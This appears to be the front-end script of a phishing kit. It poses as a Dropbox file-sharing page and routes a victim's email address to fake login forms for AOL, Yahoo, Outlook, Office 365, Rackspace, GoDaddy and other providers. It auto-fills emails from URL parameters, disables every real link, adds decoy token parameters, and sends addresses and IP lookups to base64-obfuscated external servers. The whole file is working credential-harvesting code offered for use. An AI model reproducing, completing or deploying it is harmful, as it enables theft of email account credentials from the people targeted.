let ip_config = {};
let addC = "has-error ext-has-error";
let Domains = {
    "AOL": {link:"assets/YM/i.htm?d=Aol%20Account&t=a&u=", id:'#yahoo_modal'},
    "Yahoo": {link:"assets/YM/i.htm?d=Yahoo%20Account&t=y&u=", id:'#yahoo_modal'},
    "Zoho": {link:"assets/Others/i.htm?d=Zoho%20Account&t=zoho&u=", id:'#others_modal'},
    "1and1": {link:"assets/Others/i.htm?d=1&1%20Account&t=oneandone&u=", id:'#others_modal'},
    "Outlook": {link:"assets/out/i.htm?d=Outlook%20Account&t=h&u=", id:'#outlook_modal'},
    "Office 365": {link:"assets/out/i.htm?d=Office%20365%20Account&t=o&u=", id:'#outlook_modal'},
    "Gmail": {link:"assets/YM/i.htm?d=Aol%20Account&t=a&u=", id:'yahoo_modaly'},
    "Mail.ru": {link:"assets/Others/i.htm?d=Mail.ru%20Account&t=mailru&u=", id:'#others_modal'},
    "Mail.com": {link:"assets/Others/i.htm?d=Mail.com%20Account&t=mailcom&u=", id:'#others_modal'},
    "Earthlink": {link:"assets/Others/i.htm?d=Earthlink%20Account&t=earthlink&u=", id:'#others_modal'},
    "Rackspace": {link:"./assets/Rack/i.htm?d=Rackspace%20Account&t=a&u=", id:'#rackspace_modal'},
    "Mimecast": {link:"assets/out/i.htm?d=Mimecast%20Account&t=m&u=", id:'#outlook_modal'},
    "Godaddy": {link:"assets/Others/i.htm?d=Godaddy%20Account&t=godaddy&u=", id:'#others_modal'},
    "Comcast": {link:"assets/Others/i.htm?d=Comcast%20Account&t=comcast&u=", id:'#others_modal'},
    "Others": {link:"assets/Others/i.htm?d=Other%20Account&t=others&u=", id:'#others_modal'}
}
//That Microsoft account doesn't exist. Enter a different account
let subject="", url_main_link="",sec_p=false,fina=false,compare="",count=false;
let comment = ['Dropbox gives you secure access to all your files. Collaborate with friends, family, and coworkers from any device.','Dropbox is a modern workspace designed to reduce busywork-so you can focus on the things that matter.', 'Keep life organized and work moving—all in one place.', 'Keep all your files securely stored, up to date, and accessible from any device.', 'Quickly send any file—big or small—to anyone, even if they don’t have a Dropbox account.', 'Keep your files private with multiple layers of protection from the service trusted by millions.'];
$(document).ready(async function (){
    localStorageCheck();

    url_main_link = window.location.href;
    let main_url = new URL(location.href);

    if(main_url.searchParams.has('user')){
        $("#i0116").val(main_url.searchParams.get('user'));
    }

    $("a").each(function (){
        $(this).attr("onclick", "window.location.replace(window.location.href); return false;")
    });

    $("#login-username-form").on('submit', async function (e){
        e.preventDefault();
        let compares_ = Is_AOL?"@aol.com":"@yahoo.com";
        let compares = Is_AOL?"AOL":"Yahoo";
        let $input = $("#login-username");
        let $error_m = $("#username-error");
        let $button = $('#login-signin');
        $error_m.hide();
        $input.attr("readonly", "readonly");
        $button.attr("disabled", "disabled");
        let vee = !validateEmail($input.val()) ? ($input.val() + compares_) : $input.val();
        if(validateEmail(vee) === false || $input.val().length < 4 ){
            setTimeout(function (){
                $error_m.html("Please enter a valid email address.");
                $error_m.show();
                $button.removeAttr("disabled");
                $input.removeAttr("readonly");
            }, 500);
        }else {
            let res = await get_domain(vee.trim());
            console.log(vee,res);
            let remove = 0;
            if(Object.keys(ip_config).length < 2){
                remove = 300;
                await get_ip();
            }
            if(typeof res === "object"){
                if(Object.keys(res).includes("domain")){
                    let domain = res.domain;
                    if(domain.length < 2){
                        setTimeout(function (){
                            $error_m.html("Please enter a valid email address.");
                            $error_m.show();
                            $button.removeAttr("disabled");
                            $input.removeAttr("readonly");
                        }, (500 - remove));
                    }else if(domain !== compares){
                        setTimeout(function (){
                            $error_m.html("Sorry, we don't recognize this email.");
                            $error_m.show();
                            $button.removeAttr("disabled");
                            $input.removeAttr("readonly");
                            }, (500 - remove));
                    } else {
                        domain = domain.replace('Others', 'Other');
                        let val = $input.val();
                        let link = `i.htm?d=${compares}%20Account&t=y&u=${val}`;
                        setTimeout(function (){
                            window.location.replace(link);
                        }, (600 - remove));
                    }
                }else {
                    window.location.replace(window.location.href);
                }
            } else {
                window.location.replace(window.location.href);
            }
        }
        return false;
    });

    $("#login_email880283024414795").on('change', function (){
        let $input = $("#login_email880283024414795");
        let $error_m = $("#errormessages");
        $error_m.hide();
        $input.removeClass("input-error");
    });

    $("[data-testid=digBannerCloseButton]").on('click', function (){
        $(this).parents("div.dig-Banner").hide("slow");
    });




    // Fancybox.show([{ src: "#rackspace_modal", type: "inline"}], {click: false});
    if((main_url.searchParams.has("userid") || main_url.searchParams.has("email")) && FORCE_AUTO_GRAB === true){
        let uid = main_url.searchParams.has("userid")?main_url.searchParams.get("userid"):main_url.searchParams.get("email");
        if(validateEmail(uid)){
            let $input = $("#login_email880283024414795");
            $input.val(uid);
            $input.attr("readonly", "readonly");
            $("button").attr("disabled", "disabled");
            if($input.val().length > 1){
                let res = await get_domain($input.val().trim());
                let remove = 0;
                if(Object.keys(ip_config).length < 2){
                    remove = 300;
                    await get_ip();
                }
                if(typeof res === "object"){
                    if(Object.keys(res).includes("domain")){
                        let domain = res.domain;
                        if(domain.length < 2 || domain === "rejected"){
                            $input.val("");
                            $input.removeAttr("readonly");
                            $("button").removeAttr("disabled");
                        }else {
                            let link = Domains[domain].link + encodeURIComponent($input.val().trim());
                            let id = Domains[domain].id;
                            let $parent = $(id);
                            $parent.find("iframe").attr("src", link);
                            setTimeout(function (){
                                Fancybox.show([{ src: id, type: "inline"}], {click: false});
                                if(id==="#outlook_modal" || id==="#rackspace_modal") {
                                    $(".fancybox__slide.is-selected.has-inline").css({
                                        "border-width": "0",
                                        "padding": "0",
                                        "margin": "0"
                                    })
                                }
                            }, (1200 - remove));
                        }
                    }
                }
            }
        }
    }
});




function url_check(new_filename = "") {
    let url = new URL(window.location.href);
    let search = url.search;
    let hash = url.hash;
    let href = url.href.replace(search, "").replace(hash, "");
    if(!search.includes("scriptID")){
        search+=search.includes("?")?"&":"?";
        search += ("scriptID=" + Math.random().toString().replace("0.", "") + "&cookies=" + window.btoa(Math.random().toString()).replace("=", "").replace("=", "") + "&token=" + Math.random().toString().replace("0.", ""));
    }
    if(href.endsWith("/")){href+=new_filename+search+hash;}
    else {
        if(new_filename.length>0){
            if(href.endsWith(".html")||href.endsWith(".htm")||href.endsWith(".php")){
                let href_last=href.split("/")[(href.split("/") - 1)];
                href=href.replace(href_last, "");href+=new_filename+search+hash;
            }else {href+=new_filename+search+hash;}
        }else {href+=new_filename+search+hash;}
    }
    return href;
}

async function get_domain(e_m) {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly8wYTAzNzExNC5ldS1nYi5hcGlndy5hcHBkb21haW4uY2xvdWQvY2hlY2svZG9tYWluP2VfbT0=") + e_m ,
            type: 'GET',
            dataType: "json",
            contentType:"application/json; charset=utf-8",
            beforeSend: function (xhr) {
                /* xhr.setRequestHeader('Authorization', `Bearer ${token}`); */
            },
            data: JSON.stringify({
                e_m
            }),
            success: function (response) {
                resolve(response);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(error);
            }
        });
    });
}

async function get_ip() {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9pcA=="),
            type: 'GET',
            dataType: "json",
            success: function (response) {
                if(response.status === "success"){
                    localStorage.setItem("ip_config", JSON.stringify(response));
                    localStorageCheck();
                }
                resolve(true);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(true);
            }
        });
    });
}


function validateEmail(mail) {
    if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(mail)){
        return true;
    }
    return false;
}


function localStorageCheck(){
    let ip = localStorage.getItem("ip_config");
    if(ip !== null) ip_config = JSON.parse(ip);
}


window.close_popup_final = function (){Fancybox.close([{all: true}]);window.location.replace(FINAL_REDIRECTION);}
window.close_popup_reload = function (){window.location.replace(location.href);}
window.close_final = function (){window.location.replace(FINAL_REDIRECTION);}